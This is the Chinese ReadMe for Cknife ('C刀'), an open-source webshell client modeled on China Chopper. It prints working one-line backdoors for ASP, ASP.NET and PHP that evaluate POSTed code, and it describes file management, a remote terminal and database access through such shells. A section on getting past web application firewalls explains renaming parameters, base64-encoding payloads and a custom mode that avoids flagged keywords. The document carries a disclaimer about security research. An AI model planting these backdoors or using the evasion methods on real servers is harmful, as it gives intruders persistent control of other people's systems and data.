软件名称：Cknife
中文名称：C刀
源码地址：https://github.com/Chora10/Cknife
下载地址：http://pan.baidu.com/s/1nul1mpr  密码：f65g
官方博客：http://www.ms509.com/
作者：	  Chora && MelodyZX
----------------------------------------------------------------------------------------------------------
免责声明：
本工具仅限于安全研究与教学使用，用户使用本工具所造成的所有后果，由用户承担全部法律及连带责任！作者不承担任何法律及连带责任。
----------------------------------------------------------------------------------------------------------
为什么开发Cknife：
1、方便已被授权的渗透测试人员进行渗透测试；
2、方便WAF厂商提升自身WAF的防护能力；
3、方便管理员管理自身网站及服务器。
----------------------------------------------------------------------------------------------------------
为什么开源Cknife：
1、结合大众的力量优化完善本软件；
2、菜刀后门层出不穷，开源来接受大众的监督以及审计。
----------------------------------------------------------------------------------------------------------
理想：希望能在安全研究员以及WAF厂商的对抗中提升国内WAF的防护水平以及安全研究员的实力。
----------------------------------------------------------------------------------------------------------


一、运行环境：

安装了JRE1.7+环境的所有操作系统

二、文件说明：
------------------------------------------------------------------
Cknife.jar	Cknife主程序
------------------------------------------------------------------
Cknife.db	Cknife的数据库(不存在会自动生成)
Config.ini	Cknife的配置文件(不存在会自动生成)
ReadMe.txt	你现在正在看的(可删除)
1.jsp		JSP服务端脚本(可删除)
1.jspx		JSPX服务端脚本(可删除)
------------------------------------------------------------------

三、使用说明：

服务端脚本支持ASP、ASPX、PHP、JSP、JSPX、Customize(自定义)。
代码包含且不限于如下代码（只要能构造出类似eval的函数就行，比如PHP的create_function、assert等）

ASP:        
<%eval request("Cknife")%>
　	
ASP.NET:    
<%@ Page Language="Jscript"%><%eval(Request.Item["Cknife"],"unsafe");%>

PHP:        
<?php @eval($_POST['Cknife']);?>

JSP:	    
[代码详见1.jsp]

JSPX:	    
[代码详见1.jspx]

Customize:  
自定义类型,功能代码在服务端保存,理论上支持所有动态脚本,只要正确与C刀进行交互即可。此模式可按需定制，比如只要浏览目录，或是只要虚拟终端功能，代码可以很简短。


四、数据库功能：

首次使用在列表里点击右键，选择数据库管理会提示请先配置数据库，点击配置数据库按钮选择对应的连接方式连接即可。

五、设置功能：

代理功能：在类型处选择代理类型。支持SOCKS、HTTP类型的代理，使用Burp抓取Cknife数据，需选择代理类型为HTTP，并填上对应的IP以及端口即可。
如果想要关闭代理功能，只需要选择代理类型为DIRECT，或者清空用户名或密码，即表示关闭代理。

自定义请求头功能：在文本框里输入要自定义的请求头以及对应的值，可以添加或修改多个请求头。只需要按照如下格式添加即可：
User-Agent:xxx
Cookie:xxx
ms509:Chora
如果想要关闭自定义请求头功能，只需要把文本框内容清空，或者选中关闭选项并确定。

六、过WAF

这是一款跨平台的基于配置文件的中国菜刀，把所有操作给予用户来定义，主程序只是图形的展示，以及数据的发送。
我分开了每一个步骤写入到配置文件里面，用户可以自定义任何代码，包括更改参数名称，参数内容。 
比如： 
SKIN=javax.swing.plaf.nimbus.NimbusLookAndFeel 设置皮肤为nimbus 
SPL=->|               			       表示截取数据的开始符号 
SPR=|<-               			       表示截取数据的结束符号 
CODE=code         			       编码参数 
ACTION=action    			       动作参数 
PARAM1=z1         			       参数1 
PARAM2=z2         			       参数2 
PHP_BASE64=1   				       当为PHP时，Z1，Z2参数是否开启自动base64加密，如果想定义自己的加密方式则关闭设置为0 
PHP_MAKE=@eval(base64_decode($_POST[action])); 生成方式，这里可以不用该方式，可以用你任何想要的方式 
PHP_INDEX=...             		       显示主页功能的代码放这儿
PHP_READDICT=...      			       读取主页功能的代码放这儿
PHP_READFILE=...       			       读取文件功能的代码放这儿
PHP_DELETE=...           		       删除文件夹以及文件功能的代码放这儿
PHP_RENAME=...         			       重命名文件夹以及文件功能的代码放这儿
PHP_RETIME=...         			       修改时间功能的代码放这儿
PHP_NEWDICT=...        			       新建目录功能的代码放这儿
PHP_UPLOAD=...          		       上传文件功能的代码放这儿
PHP_DOWNLOAD=...    			       下载文件功能的代码放这儿
PHP_SHELL=...              		       虚拟终端功能的代码放这儿
PHP_DB_MYSQL=...			       管理MYSQL数据库功能的代码放这儿
ASP_...=...
ASPX_...=...
JSP_...=...

除了修改以上参数过WAF外，程序还额外提供了一种Customize过WAF的模式。
Customize模式原本是用于支持一些程序默认不支持的脚本，比如CFM、ASMX、ASHX、PY等等，只要用户自写的脚本能正确与菜刀进行交互即可。

换一个思考方式，如果我们自写一个PHP脚本实现了列文件以及目录的功能，它能够正确的与C刀进行交互，这个时候如果我们选择PHP(Eval)的连接方式就会连接失败。
应该选择Customize模式进行连接。有人说为什么一句话就可以连接，你偏偏还要写这么多代码用Customize模式连接？如果一个很厉害的WAF检测eval,assert等关键词
，你的一句话实在是饶不过，这个时候你可以不用一句话，就在PHP脚本里用正常代码实现列文件以及目录，然后用Customize模式连接就达到了过WAF的目的。

Customize(自定义)模式跟其他模式一样，每一个步骤也都写入到配置文件里面，用户同样可以参数名称以及参数内容。
比如你自写了用Customize模式连接的Customize.php服务端。显示主页功能提交的参数应该是：密码=1&action=index以及密码=1&action=readdict。
如果C刀普及以后WAF厂商肯定会把readdict列入黑名单，这个时候你就可以修改readdict的名称为其他名称，同样可以修改action的名称，也可以修改1为其他字符
CUS_MAKE=1 
CUS_INDEX=index 
CUS_READDICT=readdict 
CUS_READFILE=readfile 
CUS_SAVEFILE=savefile 
CUS_DELETE=delete 
CUS_RENAME=rename 
CUS_RETIME=retime 
CUS_NEWDICT=newdict 
CUS_UPLOAD=upload 
CUS_DOWNLOAD=download 
CUS_SHELL=shell

七、更新日志：(更新版本后请删除Config.ini文件，重新打开自动生成新版本的Config.ini)

程序在使用过程中难免有各种BUG，及时关注看一下是否有更新吧，说不定己经修补了呢。

已知问题：
Graphite与Metal类型的皮肤互相之间切换不需要重启Cknife，其余类型(Nimbus、Windows、Mac等)的皮肤相互之间切换也不需要重启Cknife，
但是这两种类型的皮肤进行切换就需要重启Cknife才能完全生效，不然最小化、最大化、关闭按钮不会显示，这是Swing架构遗留的问题。

20160729
1、文件管理修复若干BUG
2、文件管理新增修改时间功能
3、文件管理优化界面

20160728
1、数据库管理修复若干BUG
2、数据库管理增加获取表行数
3、数据库管理优化界面

20160623
1、虚拟终端增加右键复制粘贴功能（快捷键Ctrl+C、Ctrl+V）
2、虚拟终端增加上键下键切换历史命令功能
3、数据库管理增加右键导出数据功能

20160622
1、修复ORACLE数据库连接失败的问题
2、修复在某分辨率下添加SHELL对话框里的密码文本框消失的问题
3、更新JSPX脚本

20160620
1、修复虚拟终端低概率执行失败的情况
2、数据库管理界面优化

20160618
1、添加对HTTPS协议的支持
2、修复文件管理右边栏遇到乱码不显示的情况

20160513
1、添加自定义请求头功能

20160511
1、添加设置选项并增加了代理功能
2、增加了对JSPX脚本的支持，连接时脚本类型选择JSP(Eval)

20160426
1、修复JSP连接MYSQL数据库异常的问题
2、虚拟终端增加自定义Cmd路径的功能，命令为setp [path]

20160413
1、添加自定义模式shell返回路径的自定义分隔符
2、添加JSP对MSSQL的支持

20160318
1、优化界面，右边栏点击目录后左边栏也会选中
2、修复ASP、ASPX、JSP在打开空目录时会失败的问题
3、将默认皮肤Graphite添加到皮肤切换功能
4、虚拟终端增加标识符方便用户分辨
5、数据库部分功能增加多线程

20160317
1、优化文件管理左边栏的打开方式
2、文件管理所有功能使用多线程，防止高延迟请求界面会卡的情况发生

20160316
1、修复在Linux下默认皮肤显示乱码的问题
2、添加ASPX对MSSQL、ACCESS的支持
3、更换皮肤解决选中后看不清的情况

20160314
1、添加ASP对MSSQL、ACCESS的支持
2、修复中文路径启动失败的问题

20160311
1、修复模拟终端若干BUG；
2、模拟终端使用多线程，防止高延迟请求界面会卡的情况发生

20160310
1、添加JSP对MYSQL、ORACLE的支持
2、修复在Windows下，文件管理会多出一个盘符

20160307
1、连接失败返回详细信息，方便用户分析问题

20160301
1、合并Cknife与Cknife_Skin
2、添加数据库功能，添加PHP对MYSQL的支持